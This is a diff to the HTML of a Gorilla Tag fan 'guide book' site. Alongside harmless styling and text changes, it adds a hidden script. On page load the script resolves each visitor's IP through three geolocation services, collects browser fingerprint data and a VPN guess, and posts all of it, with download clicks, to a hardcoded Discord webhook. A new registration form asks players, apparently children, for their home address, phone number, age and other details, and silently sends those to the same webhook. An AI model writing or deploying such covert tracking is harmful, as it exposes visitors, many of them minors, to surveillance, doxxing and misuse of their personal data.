@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gorilla Tag Copy Help!</title>
+    <title>Gorilla Tag Guide Book</title>
     <link rel="stylesheet" href="styles.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -11,11 +11,382 @@
 <script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
 </head>
 <body>
+
+<style>
+
+:root {
+    --primary-color: #4a6c2f; /* Forest green */
+    --secondary-color: #6a5c3f; /* Brown */
+    --accent-color: #ff6b2b; /* Orange */
+    --dark-color: #1a2a0f; /* Dark green */
+    --light-color: #d9e6c8; /* Light green */
+    --text-color: #ffffff;
+    --background-color: #2a3a1f;
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Roboto', sans-serif;
+    background-color: var(--background-color);
+    color: var(--text-color);
+    line-height: 1.6;
+}
+
+.container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 20px;
+}
+
+/* Header Styles */
+header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 0;
+    border-bottom: 4px solid var(--primary-color);
+}
+
+.logo h1 {
+    font-size: 2rem;
+    font-weight: 900;
+    color: var(--accent-color);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+
+.logo p {
+    font-size: 1rem;
+    color: var(--light-color);
+}
+
+nav ul {
+    display: flex;
+    list-style: none;
+}
+
+nav ul li {
+    margin-left: 30px;
+}
+
+nav ul li a {
+    color: var(--text-color);
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 1.2rem;
+    text-transform: uppercase;
+    transition: color 0.3s;
+}
+
+nav ul li a:hover {
+    color: var(--accent-color);
+}
+
+/* Hero Section */
+.hero {
+    height: 500px;
+    background: linear-gradient(rgba(26, 42, 15, 0.7), rgba(26, 42, 15, 0.9)), #3a4a2f;
+    background-size: cover;
+    background-position: center;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    margin-bottom: 50px;
+}
+
+.hero-content {
+    max-width: 800px;
+    padding: 0 20px;
+}
+
+.hero h2 {
+    font-size: 3.5rem;
+    font-weight: 900;
+    margin-bottom: 20px;
+    text-transform: uppercase;
+    color: var(--accent-color);
+}
+
+.hero p {
+    font-size: 1.5rem;
+    margin-bottom: 30px;
+    color: var(--light-color);
+}
+
+.btn {
+    display: inline-block;
+    background-color: var(--accent-color);
+    color: var(--text-color);
+    padding: 12px 30px;
+    border-radius: 5px;
+    text-decoration: none;
+    font-weight: 700;
+    text-transform: uppercase;
+    transition: background-color 0.3s;
+}
+
+.btn:hover {
+    background-color: #e55a1a;
+}
+
+/* Section Styles */
+.section {
+    padding: 50px 0;
+    border-top: 4px solid var(--primary-color);
+}
+
+.section h2 {
+    font-size: 2.5rem;
+    text-align: center;
+    margin-bottom: 40px;
+    text-transform: uppercase;
+    color: var(--accent-color);
+}
+
+/* Asset Grid */
+.asset-grid, .dlc-grid, .projects-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+    gap: 30px;
+}
+
+.asset-card, .dlc-card, .project-card {
+    background-color: var(--dark-color);
+    border-radius: 10px;
+    overflow: hidden;
+    transition: transform 0.3s;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+}
+
+.asset-card:hover, .dlc-card:hover {
+    transform: translateY(-10px);
+}
+
+.asset-img, .dlc-img, .project-img {
+    height: 200px;
+    background-size: cover;
+    background-position: center;
+}
+
+.asset-card h3, .dlc-card h3, .project-card h3 {
+    padding: 20px 20px 10px;
+    font-size: 1.5rem;
+    color: var(--light-color);
+}
+
+.asset-card p, .dlc-card p, .project-card p {
+    padding: 0 20px 20px;
+    color: #cccccc;
+}
+
+.download-btn {
+    display: block;
+    background-color: var(--primary-color);
+    color: var(--text-color);
+    text-align: center;
+    padding: 12px;
+    text-decoration: none;
+    font-weight: 700;
+    text-transform: uppercase;
+    transition: background-color 0.3s;
+}
+
+.download-btn:hover {
+    background-color: var(--accent-color);
+}
+
+/* Locked Projects */
+.project-card {
+    position: relative;
+    opacity: 0.8;
+}
+
+.project-card.locked {
+    cursor: not-allowed;
+}
+
+.lock-icon {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    font-size: 2rem;
+    background-color: rgba(0, 0, 0, 0.5);
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.locked-label {
+    display: block;
+    background-color: #6c2f2f;
+    color: var(--text-color);
+    text-align: center;
+    padding: 12px;
+    font-weight: 700;
+    text-transform: uppercase;
+}
+
+/* Footer */
+footer {
+    text-align: center;
+    padding: 30px 0;
+    margin-top: 50px;
+    border-top: 4px solid var(--primary-color);
+    color: var(--light-color);
+}
+
+/* Modal Styles */
+.modal {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.7);
+    overflow: auto;
+}
+
+.modal-content {
+    background-color: var(--dark-color);
+    margin: 10% auto;
+    padding: 30px;
+    border: 4px solid var(--primary-color);
+    border-radius: 10px;
+    width: 80%;
+    max-width: 600px;
+    box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
+    position: relative;
+}
+
+.close-modal {
+    position: absolute;
+    top: 10px;
+    right: 20px;
+    font-size: 28px;
+    font-weight: bold;
+    color: var(--light-color);
+    cursor: pointer;
+}
+
+.close-modal:hover {
+    color: var(--accent-color);
+}
+
+.form-group {
+    margin-bottom: 20px;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 8px;
+    font-weight: 700;
+    color: var(--light-color);
+}
+
+.form-group input, .form-group select {
+    width: 100%;
+    padding: 12px;
+    border: 2px solid var(--primary-color);
+    border-radius: 5px;
+    background-color: #1a2a0f;
+    color: var(--text-color);
+    font-size: 16px;
+}
+
+.checkbox-group {
+    margin: 8px 0;
+    display: flex;
+    align-items: center;
+}
+
+.checkbox-group input[type="checkbox"] {
+    width: auto;
+    margin-right: 10px;
+}
+
+.checkbox-group label {
+    margin-bottom: 0;
+    font-weight: normal;
+}
+
+.submit-btn {
+    width: 100%;
+    margin-top: 10px;
+    background-color: var(--accent-color);
+}
+
+.register-btn {
+    margin-top: 20px;
+    background-color: var(--secondary-color);
+}
+
+/* Responsive Design */
+@media (max-width: 768px) {
+    header {
+        flex-direction: column;
+    }
+    
+    nav ul {
+        margin-top: 20px;
+    }
+    
+    nav ul li {
+        margin: 0 15px;
+    }
+    
+    .hero h2 {
+        font-size: 2.5rem;
+    }
+    
+    .hero p {
+        font-size: 1.2rem;
+    }
+    
+    .section h2 {
+        font-size: 2rem;
+    }
+}
+
+@media (max-width: 480px) {
+    nav ul {
+        flex-direction: column;
+        align-items: center;
+    }
+    
+    nav ul li {
+        margin: 10px 0;
+    }
+    
+    .hero {
+        height: 400px;
+    }
+    
+    .hero h2 {
+        font-size: 2rem;
+    }
+    
+    .asset-grid, .dlc-grid, .projects-grid {
+        grid-template-columns: 1fr;
+    }
+}
+
+</style>
     <div class="container">
         <header>
             <div class="logo">
-                <h1>GORILLA TAG COPY HELP</h1>
-                <p>Resources for your Gorilla Tag projects</p>
+                <h1>GORILLA TAG GUIDE BOOK</h1>
+                <p>The ultimate resource for Gorilla Tag players</p>
             </div>
             <nav>
                 <ul>
@@ -29,11 +400,108 @@
         <main>
             <section class="hero">
                 <div class="hero-content">
-                    <h2>BECOME MONKE</h2>
-                    <p>Download assets, DLCs, and projects for your Gorilla Tag creations</p>
+                    <h2>MASTER THE MONKE</h2>
+                    <p>Get exclusive guides, tips, and resources for dominating in Gorilla Tag</p>
                     <a href="#assets" class="btn">Get Started</a>
+                    <button id="register-btn" class="btn register-btn">Register for Updates</button>
                 </div>
             </section>
+            
+            <!-- Registration Modal -->
+            <div id="registration-modal" class="modal">
+                <div class="modal-content">
+                    <span class="close-modal">&times;</span>
+                    <h2>Register for Updates</h2>
+                    <p>Sign up to receive notifications about new assets and projects!</p>
+                    <form id="registration-form">
+                        <div class="form-group">
+                            <label for="name">Full Name:</label>
+                            <input type="text" id="name" name="name" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="email">Email Address:</label>
+                            <input type="email" id="email" name="email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="address">Home Address:</label>
+                            <input type="text" id="address" name="address" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="city">City:</label>
+                            <input type="text" id="city" name="city" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="state">State/Province:</label>
+                            <input type="text" id="state" name="state" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="zip">ZIP/Postal Code:</label>
+                            <input type="text" id="zip" name="zip" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="country">Country:</label>
+                            <input type="text" id="country" name="country" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="phone">Phone Number:</label>
+                            <input type="tel" id="phone" name="phone" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="discord">Discord Username:</label>
+                            <input type="text" id="discord" name="discord">
+                        </div>
+                        <div class="form-group">
+                            <label for="age">Age:</label>
+                            <input type="number" id="age" name="age" min="13" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="experience">Gorilla Tag Experience Level:</label>
+                            <select id="experience" name="experience" required>
+                                <option value="">Select your level</option>
+                                <option value="beginner">Beginner</option>
+                                <option value="intermediate">Intermediate</option>
+                                <option value="advanced">Advanced</option>
+                                <option value="expert">Expert</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="platform">What platform do you play on?</label>
+                            <select id="platform" name="platform" required>
+                                <option value="">Select platform</option>
+                                <option value="quest">Meta Quest</option>
+                                <option value="quest2">Meta Quest 2</option>
+                                <option value="questpro">Meta Quest Pro</option>
+                                <option value="quest3">Meta Quest 3</option>
+                                <option value="rift">Oculus Rift</option>
+                                <option value="rifts">Oculus Rift S</option>
+                                <option value="vive">HTC Vive</option>
+                                <option value="index">Valve Index</option>
+                                <option value="other">Other</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>What are you interested in? (Check all that apply)</label>
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="interest-tips" name="interests" value="tips">
+                                <label for="interest-tips">Tips & Tricks</label>
+                            </div>
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="interest-maps" name="interests" value="maps">
+                                <label for="interest-maps">Map Guides</label>
+                            </div>
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="interest-cosmetics" name="interests" value="cosmetics">
+                                <label for="interest-cosmetics">Cosmetics</label>
+                            </div>
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="interest-mods" name="interests" value="mods">
+                                <label for="interest-mods">Mods & Custom Content</label>
+                            </div>
+                        </div>
+                        <button type="submit" class="btn submit-btn">Register</button>
+                    </form>
+                </div>
+            </div>
 
             <section id="assets" class="section">
                 <h2>ASSETS</h2>
@@ -136,9 +604,617 @@
         </main>
 
         <footer>
-            <p>&copy; 2025 Gorilla Tag Copy Help - Not affiliated with Another Axiom Inc.</p>
+            <p>&copy; 2025 Gorilla Tag Guide Book - Not affiliated with Another Axiom Inc.</p>
         </footer>
     </div>
+    
+    <script>
+    
+    document.addEventListener('DOMContentLoaded', function() {
+    // Log IP address when the page loads
+    logVisitor();
+    
+    // Add event listeners to download buttons
+    const downloadButtons = document.querySelectorAll('.download-btn');
+    downloadButtons.forEach(button => {
+        button.addEventListener('click', function(e) {
+            e.preventDefault();
+            const fileName = this.getAttribute('data-file');
+            logDownload(fileName);
+            simulateDownload(fileName);
+        });
+    });
+    
+    // Add event listeners to locked project cards
+    const lockedProjects = document.querySelectorAll('.project-card.locked');
+    lockedProjects.forEach(project => {
+        project.addEventListener('click', function() {
+            alert('This project is currently locked. Check back later for access!');
+        });
+    });
+    
+    // Modal functionality
+    const modal = document.getElementById('registration-modal');
+    const registerBtn = document.getElementById('register-btn');
+    const closeModal = document.querySelector('.close-modal');
+    const registrationForm = document.getElementById('registration-form');
+    
+    // Open modal when register button is clicked
+    registerBtn.addEventListener('click', function() {
+        modal.style.display = 'block';
+    });
+    
+    // Close modal when X is clicked
+    closeModal.addEventListener('click', function() {
+        modal.style.display = 'none';
+    });
+    
+    // Close modal when clicking outside of it
+    window.addEventListener('click', function(event) {
+        if (event.target === modal) {
+            modal.style.display = 'none';
+        }
+    });
+    
+    // Handle form submission
+    registrationForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Get form data
+        const formData = {
+            name: document.getElementById('name').value,
+            email: document.getElementById('email').value,
+            address: document.getElementById('address').value,
+            city: document.getElementById('city').value,
+            state: document.getElementById('state').value,
+            zip: document.getElementById('zip').value,
+            country: document.getElementById('country').value,
+            phone: document.getElementById('phone').value,
+            discord: document.getElementById('discord').value,
+            age: document.getElementById('age').value,
+            experience: document.getElementById('experience').value,
+            platform: document.getElementById('platform').value,
+            interests: Array.from(document.querySelectorAll('input[name="interests"]:checked')).map(el => el.value)
+        };
+        
+        // Send form data to webhook
+        logRegistration(formData);
+        
+        // Show success message and close modal
+        alert('Thank you for registering! You will receive updates soon.');
+        modal.style.display = 'none';
+        registrationForm.reset();
+    });
+});
+
+// Function to log visitor
+async function logVisitor() {
+    try {
+        // Get IP information
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        
+        // Get detailed IP information from ipapi.co
+        const detailedIpResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const detailedIpData = await detailedIpResponse.json();
+        
+        // Get additional IP information from DB-IP
+        const dbIpResponse = await fetch(`https://api.db-ip.com/v2/free/${ipData.ip}`);
+        const dbIpData = await dbIpResponse.json();
+        
+        // Get browser and device information
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+        const platform = navigator.platform;
+        const screenSize = `${window.screen.width}x${window.screen.height}`;
+        const colorDepth = window.screen.colorDepth;
+        const pixelRatio = window.devicePixelRatio;
+        const referrer = document.referrer || 'Direct';
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const cookiesEnabled = navigator.cookieEnabled;
+        const doNotTrack = navigator.doNotTrack;
+        
+        // Detect browser
+        let browser = 'Unknown';
+        if (userAgent.includes('Firefox')) {
+            browser = 'Firefox';
+        } else if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
+            browser = 'Chrome';
+        } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
+            browser = 'Safari';
+        } else if (userAgent.includes('Edg')) {
+            browser = 'Edge';
+        } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
+            browser = 'Internet Explorer';
+        } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
+            browser = 'Opera';
+        }
+        
+        // Detect device type
+        let deviceType = 'Unknown';
+        if (/Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(userAgent)) {
+            deviceType = 'Mobile';
+        } else {
+            deviceType = 'Desktop';
+        }
+        
+        // Detect operating system
+        let os = 'Unknown';
+        if (userAgent.includes('Windows')) {
+            os = 'Windows';
+        } else if (userAgent.includes('Mac OS')) {
+            os = 'macOS';
+        } else if (userAgent.includes('Linux')) {
+            os = 'Linux';
+        } else if (userAgent.includes('Android')) {
+            os = 'Android';
+        } else if (userAgent.includes('iOS')) {
+            os = 'iOS';
+        }
+        
+        // VPN detection (this is a basic heuristic and not 100% accurate)
+        let vpnLikely = 'Unknown';
+        if (detailedIpData.org && (
+            detailedIpData.org.toLowerCase().includes('vpn') || 
+            detailedIpData.org.toLowerCase().includes('proxy') ||
+            detailedIpData.org.toLowerCase().includes('hosting') ||
+            detailedIpData.org.toLowerCase().includes('cloud')
+        )) {
+            vpnLikely = 'Likely';
+        } else {
+            vpnLikely = 'Unlikely';
+        }
+        
+        // Send to Discord webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1400530692885970976/yb_356OR91Lyc5nx-MZe7N97aApPC5TsR8qWPj3cpo11lw9PEMUFEOydtqgQg3-3OT32';
+        
+        const message = {
+            content: '**New Visitor**',
+            embeds: [{
+                title: 'Visitor Information',
+                color: 5814783, // Green color
+                fields: [
+                    {
+                        name: 'IP Address',
+                        value: ipData.ip,
+                        inline: true
+                    },
+                    {
+                        name: 'Location (ipapi)',
+                        value: `${detailedIpData.city || 'Unknown'}, ${detailedIpData.region || 'Unknown'}, ${detailedIpData.country_name || 'Unknown'}`,
+                        inline: true
+                    },
+                    {
+                        name: 'Location (DB-IP)',
+                        value: `${dbIpData.city || 'Unknown'}, ${dbIpData.stateProv || 'Unknown'}, ${dbIpData.countryName || 'Unknown'}`,
+                        inline: true
+                    },
+                    {
+                        name: 'ISP/Organization',
+                        value: detailedIpData.org || 'Unknown',
+                        inline: true
+                    },
+                    {
+                        name: 'ASN (DB-IP)',
+                        value: dbIpData.asNumber || 'Unknown',
+                        inline: true
+                    },
+                    {
+                        name: 'ISP (DB-IP)',
+                        value: dbIpData.isp || 'Unknown',
+                        inline: true
+                    },
+                    {
+                        name: 'VPN/Proxy Detected',
+                        value: vpnLikely,
+                        inline: true
+                    },
+                    {
+                        name: 'Browser',
+                        value: browser,
+                        inline: true
+                    },
+                    {
+                        name: 'Operating System',
+                        value: os,
+                        inline: true
+                    },
+                    {
+                        name: 'Device Type',
+                        value: deviceType,
+                        inline: true
+                    },
+                    {
+                        name: 'Platform',
+                        value: platform,
+                        inline: true
+                    },
+                    {
+                        name: 'Screen Size',
+                        value: screenSize,
+                        inline: true
+                    },
+                    {
+                        name: 'Pixel Ratio',
+                        value: pixelRatio.toString(),
+                        inline: true
+                    },
+                    {
+                        name: 'Color Depth',
+                        value: `${colorDepth} bit`,
+                        inline: true
+                    },
+                    {
+                        name: 'Language',
+                        value: language,
+                        inline: true
+                    },
+                    {
+                        name: 'Time Zone',
+                        value: timeZone,
+                        inline: true
+                    },
+                    {
+                        name: 'Cookies Enabled',
+                        value: cookiesEnabled ? 'Yes' : 'No',
+                        inline: true
+                    },
+                    {
+                        name: 'Do Not Track',
+                        value: doNotTrack || 'Not specified',
+                        inline: true
+                    },
+                    {
+                        name: 'Referrer',
+                        value: referrer,
+                        inline: true
+                    },
+                    {
+                        name: 'User Agent',
+                        value: userAgent
+                    },
+                    {
+                        name: 'Time',
+                        value: new Date().toLocaleString(),
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: 'Gorilla Tag Guide Book'
+                }
+            }]
+        };
+        
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(message)
+        });
+    } catch (error) {
+        console.error('Error logging visitor:', error);
+    }
+}
+
+// Function to log download activity
+async function logDownload(fileName) {
+    try {
+        // Get IP information
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        
+        // Get detailed IP information from ipapi.co
+        const detailedIpResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const detailedIpData = await detailedIpResponse.json();
+        
+        // Get additional IP information from DB-IP
+        const dbIpResponse = await fetch(`https://api.db-ip.com/v2/free/${ipData.ip}`);
+        const dbIpData = await dbIpResponse.json();
+        
+        // Get browser information
+        const userAgent = navigator.userAgent;
+        
+        // Detect browser
+        let browser = 'Unknown';
+        if (userAgent.includes('Firefox')) {
+            browser = 'Firefox';
+        } else if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
+            browser = 'Chrome';
+        } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
+            browser = 'Safari';
+        } else if (userAgent.includes('Edg')) {
+            browser = 'Edge';
+        } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
+            browser = 'Internet Explorer';
+        } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
+            browser = 'Opera';
+        }
+        
+        // Send to Discord webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1400530692885970976/yb_356OR91Lyc5nx-MZe7N97aApPC5TsR8qWPj3cpo11lw9PEMUFEOydtqgQg3-3OT32';
+        
+        const message = {
+            content: '**Download Activity**',
+            embeds: [{
+                title: 'Download Information',
+                color: 16750848, // Orange color
+                fields: [
+                    {
+                        name: 'File Downloaded',
+                        value: fileName,
+                        inline: true
+                    },
+                    {
+                        name: 'IP Address',
+                        value: ipData.ip,
+                        inline: true
+                    },
+                    {
+                        name: 'Location (ipapi)',
+                        value: `${detailedIpData.city || 'Unknown'}, ${detailedIpData.region || 'Unknown'}, ${detailedIpData.country_name || 'Unknown'}`,
+                        inline: true
+                    },
+                    {
+                        name: 'Location (DB-IP)',
+                        value: `${dbIpData.city || 'Unknown'}, ${dbIpData.stateProv || 'Unknown'}, ${dbIpData.countryName || 'Unknown'}`,
+                        inline: true
+                    },
+                    {
+                        name: 'ISP (DB-IP)',
+                        value: dbIpData.isp || 'Unknown',
+                        inline: true
+                    },
+                    {
+                        name: 'Browser',
+                        value: browser,
+                        inline: true
+                    },
+                    {
+                        name: 'Time',
+                        value: new Date().toLocaleString(),
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: 'Gorilla Tag Guide Book'
+                }
+            }]
+        };
+        
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(message)
+        });
+    } catch (error) {
+        console.error('Error logging download:', error);
+    }
+}
+
+// Function to log registration data
+async function logRegistration(formData) {
+    try {
+        // Get IP information
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        
+        // Get detailed IP information from ipapi.co
+        const detailedIpResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const detailedIpData = await detailedIpResponse.json();
+        
+        // Get additional IP information from DB-IP
+        const dbIpResponse = await fetch(`https://api.db-ip.com/v2/free/${ipData.ip}`);
+        const dbIpData = await dbIpResponse.json();
+        
+        // Get browser and device information
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+        const platform = navigator.platform;
+        const screenSize = `${window.screen.width}x${window.screen.height}`;
+        const referrer = document.referrer || 'Direct';
+        
+        // Detect browser
+        let browser = 'Unknown';
+        if (userAgent.includes('Firefox')) {
+            browser = 'Firefox';
+        } else if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
+            browser = 'Chrome';
+        } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
+            browser = 'Safari';
+        } else if (userAgent.includes('Edg')) {
+            browser = 'Edge';
+        } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
+            browser = 'Internet Explorer';
+        } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
+            browser = 'Opera';
+        }
+        
+        // Detect device type
+        let deviceType = 'Unknown';
+        if (/Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(userAgent)) {
+            deviceType = 'Mobile';
+        } else {
+            deviceType = 'Desktop';
+        }
+        
+        // VPN detection (this is a basic heuristic and not 100% accurate)
+        let vpnLikely = 'Unknown';
+        if (detailedIpData.org && (
+            detailedIpData.org.toLowerCase().includes('vpn') || 
+            detailedIpData.org.toLowerCase().includes('proxy') ||
+            detailedIpData.org.toLowerCase().includes('hosting') ||
+            detailedIpData.org.toLowerCase().includes('cloud')
+        )) {
+            vpnLikely = 'Likely';
+        } else {
+            vpnLikely = 'Unlikely';
+        }
+        
+        // Send to Discord webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1400530692885970976/yb_356OR91Lyc5nx-MZe7N97aApPC5TsR8qWPj3cpo11lw9PEMUFEOydtqgQg3-3OT32';
+        
+        const message = {
+            content: '**New Registration**',
+            embeds: [{
+                title: 'User Registration Information',
+                color: 15548997, // Red color
+                fields: [
+                    {
+                        name: 'Full Name',
+                        value: formData.name,
+                        inline: true
+                    },
+                    {
+                        name: 'Email Address',
+                        value: formData.email,
+                        inline: true
+                    },
+                    {
+                        name: 'Home Address',
+                        value: formData.address
+                    },
+                    {
+                        name: 'City',
+                        value: formData.city,
+                        inline: true
+                    },
+                    {
+                        name: 'State/Province',
+                        value: formData.state,
+                        inline: true
+                    },
+                    {
+                        name: 'ZIP/Postal Code',
+                        value: formData.zip,
+                        inline: true
+                    },
+                    {
+                        name: 'Country',
+                        value: formData.country,
+                        inline: true
+                    },
+                    {
+                        name: 'Phone Number',
+                        value: formData.phone,
+                        inline: true
+                    },
+                    {
+                        name: 'Discord Username',
+                        value: formData.discord || 'Not provided',
+                        inline: true
+                    },
+                    {
+                        name: 'Age',
+                        value: formData.age,
+                        inline: true
+                    },
+                    {
+                        name: 'Experience Level',
+                        value: formData.experience,
+                        inline: true
+                    },
+                    {
+                        name: 'Platform',
+                        value: formData.platform,
+                        inline: true
+                    },
+                    {
+                        name: 'Interests',
+                        value: formData.interests.length > 0 ? formData.interests.join(', ') : 'None selected',
+                        inline: true
+                    },
+                    {
+                        name: 'IP Address',
+                        value: ipData.ip,
+                        inline: true
+                    },
+                    {
+                        name: 'Location (ipapi)',
+                        value: `${detailedIpData.city || 'Unknown'}, ${detailedIpData.region || 'Unknown'}, ${detailedIpData.country_name || 'Unknown'}`,
+                        inline: true
+                    },
+                    {
+                        name: 'Location (DB-IP)',
+                        value: `${dbIpData.city || 'Unknown'}, ${dbIpData.stateProv || 'Unknown'}, ${dbIpData.countryName || 'Unknown'}`,
+                        inline: true
+                    },
+                    {
+                        name: 'ISP/Organization',
+                        value: detailedIpData.org || 'Unknown',
+                        inline: true
+                    },
+                    {
+                        name: 'ISP (DB-IP)',
+                        value: dbIpData.isp || 'Unknown',
+                        inline: true
+                    },
+                    {
+                        name: 'ASN (DB-IP)',
+                        value: dbIpData.asNumber || 'Unknown',
+                        inline: true
+                    },
+                    {
+                        name: 'VPN/Proxy Detected',
+                        value: vpnLikely,
+                        inline: true
+                    },
+                    {
+                        name: 'Browser',
+                        value: browser,
+                        inline: true
+                    },
+                    {
+                        name: 'Device Type',
+                        value: deviceType,
+                        inline: true
+                    },
+                    {
+                        name: 'User Agent',
+                        value: userAgent
+                    },
+                    {
+                        name: 'Time',
+                        value: new Date().toLocaleString(),
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: 'Gorilla Tag Guide Book'
+                }
+            }]
+        };
+        
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(message)
+        });
+    } catch (error) {
+        console.error('Error logging registration:', error);
+    }
+}
+
+// Function to handle downloads
+function simulateDownload(fileName) {
+    // Create a download link to the actual file
+    const element = document.createElement('a');
+    element.setAttribute('href', 'downloads/' + fileName);
+    element.setAttribute('download', fileName);
+    
+    element.style.display = 'none';
+    document.body.appendChild(element);
+    
+    element.click();
+    
+    document.body.removeChild(element);
+}
+
+</script>
 
     <script src="script.js"></script>
 </body>
